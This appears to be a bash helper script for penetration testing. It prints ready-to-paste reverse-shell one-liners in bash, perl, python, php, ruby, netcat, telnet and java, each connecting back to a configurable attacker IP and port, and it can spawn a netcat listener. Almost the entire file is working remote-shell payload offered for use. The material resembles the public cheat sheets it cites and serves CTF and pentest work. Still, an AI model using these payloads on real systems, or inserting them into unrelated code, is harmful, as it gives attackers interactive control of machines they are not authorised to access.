#!/bin/bash

# This script will allow you to set a default IP and paste reverse shells on the fly

######## Written by Matthew Greer ########
######## J>^v ########

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

IP='ATTACK-IP-HERE'
PORT=ATTACK-PORT-HERE

clear # clear the screen

function bash() {
	printf "\n\t${RED}##########${NC}BASH SHELL(S)${RED}##########${NC}\n\n"

	printf "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1"

	printf "\n\n"

	printf "exec /bin/bash 0&0 2>&0"

	printf "\n\n"

	printf "0<&196;exec 196<>/dev/tcp/${IP}/${PORT}; sh <&196 >&196 2>&196"

	printf "exec 5<>/dev/tcp/${IP}/${PORT} cat <&5 | while read line; do $line 2>&5 >&5; done"

	printf "\n\n"
}

function perl() {
	printf "\n\t${RED}##########${NC}PERL SHELL(S)${RED}##########${NC}\n\n"

	printf "perl -e 'use Socket;$i=\"${IP}\";$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

	printf "\n\n"

	printf "${GREEN} LINUX: ${NC}\n"

	printf "\tperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system\$_ while<>;'"

	printf "\n\n"

	printf "${GREEN} WINDOWS: ${NC}\n"

	printf "\tperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system\$_ while<>;'"

	printf "\n\n"
}

function python() {
	printf "\n\t${RED}##########${NC}PYTHON SHELL(S)${RED}##########${NC}\n\n"

	printf "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

	printf "\n\n"
}


function php() {
	printf "\n\t${RED}##########${NC}PHP SHELL(S)${RED}##########${NC}\n\n"

	printf "php -r '$sock=fsockopen(\"${IP}\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

	printf "\n\n"
}

function ruby() {
	printf "\n\t${RED}##########${NC}RUBY SHELL(S)${RED}##########${NC}\n\n"

	printf "ruby -rsocket -e'f=TCPSocket.open(\"${IP}\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

	printf "\n\n"

	printf "${GREEN} LINUX: ${NC}\n"

	printf "\truby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${IP}\",\"${PORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

	printf "\n\n"

	printf "${GREEN} WINDOWS: ${NC}\n"

	printf "\truby -rsocket -e 'c=TCPSocket.new(\"${IP}\",\"${PORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

	printf "\n\n"
}

function netcat() {
	printf "\n\t${RED}##########${NC}NETCAT SHELL(S)${RED}##########${NC}\n\n"

	printf "nc -e /bin/sh ${IP} ${PORT}"

	printf "\n\n"

	printf "nc -c /bin/sh ${IP} ${PORT}"

	printf "\n\n"

	printf "/bin/sh | nc ${IP} ${PORT}"

	printf "\n\n"

	printf "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${IP} ${PORT} >/tmp/f"

	printf "\n\n"
}

function telnet() {
	printf "\n\t${RED}##########${NC}TELNET SHELL(S)${RED}##########${NC}\n\n"

	printf "rm -f /tmp/p; mknod /tmp/p p && telnet ${IP} ${PORT} 0/tmp/p"

	printf "\n\n"

	printf "${GREEN} Listen on machine on port 4445/tcp ${NC}\n"

	printf "\ttelnet ${IP} ${PORT} | /bin/bash | telnet ${IP} 4445"

	printf "\n\n"
}

function java() {
	printf "\n\t${RED}##########${NC}JAVA SHELL(S)${RED}##########${NC}\n\n"

	printf "r = Runtime.getRuntime()"
	printf "\n"
	printf "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${IP}/${PORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])"
	printf "\n"
	printf "p.waitFor()"

	printf "\n\n"

}

function spawn_listener() {
	gnome-terminal -e "nc -lvp ${PORT}"

}

function help() {
	printf "\n\t\t${RED}##########${NC}HELP MENU${RED}##########${NC}\n\n"

	printf "\n\t-b or --bash to display reverse shells for bash."
	printf "\n\t-p or --perl to display reverse shells for perl."
	printf "\n\t-py or --python to display reverse shells for python."	
	printf "\n\t-P or --php to display reverse shells for php."
	printf "\n\t-r or --ruby to display reverse shells for ruby."
	printf "\n\t-n or --netcat to display reverse shells for netcat."
	printf "\n\t-t or --telnet to display reverse shells for telnet."
	printf "\n\t-j or --java to display reverse shells for java."
	printf "\n\t-s or --sources to display sources"
	
	printf "\n\t--terminal as second argument to spawn a netcat listener\n\n"
}

function sources() {
	printf "\n\t${RED}##########${NC}SOURCES${RED}##########${NC}\n\n"
	printf "${GREEN} PENTEST MONKEY ${NC}\n"
	printf "\thttp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n\n"

	printf "${GREEN} BERNARDO REVERSE SHELL ONE LINERS ${NC}\n"
	printf "\thttps://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html"

	printf "\n\n"
}

if [[ $# -eq 0 ]] ; then
    help
    exit 0

elif [[ $# -eq 1 ]] ; then
	while true ; do
		case "$1" in
			-b| --bash) 
			bash ; shift 
			;;

			-p| --perl)
			perl ; shift
			;;

			-py| --python)
			python ; shift
			;;

			-P| --php)
			php ; shift
			;;

			-r| --ruby)
			ruby ; shift
			;;

			-n| --netcat)
			netcat ; shift
			;;

			-t| --telnet)
			telnet ; shift
			;;

			-j| --java)
			java ; shift
			;;

			-s| --sources)
			sources ; shift
			;;

			-h| -\? | --help)
			help ; shift
			break
			;;

		esac

		break
	done

elif [[ "$2" == "--terminal" ]] ; then
	if [[ "$1" == "-b" ]] || [[ "$1" == "--bash" ]] ; then
		bash
	elif [[ "$1" == "-p" ]] || [[ "$1" == "--perl" ]] ; then
		perl
	elif [[ "$1" == "-py" ]] || [[ "$1" == "--python" ]] ; then
		python
	elif [[ "$1" == "-P" ]] || [[ "$1" == "--PHP" ]] ; then
		php
	elif [[ "$1" == "-r" ]] || [[ "$1" == "--ruby" ]] ; then
		ruby
	elif [[ "$1" == "-n" ]] || [[ "$1" == "--netcat" ]] ; then
		netcat
	elif [[ "$1" == "-t" ]] || [[ "$1" == "--telnet" ]] ; then
		telnet
	elif [[ "$1" == "-j" ]] || [[ "$1" == "--java" ]] ; then
		java
	elif [[ "$1" == "-s" ]] || [[ "$1" == "--sources" ]] ; then	
		sources
		exit 0
	elif [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]] ; then
		help
		exit 0
	fi
	
	TERM=$(gnome-terminal -e "nc -lvp ${PORT}")

elif [[ $# -eq 3 ]] ; then
	printf "${RED}Too many arguments given!${NC}\n\n"
	help
fi
	
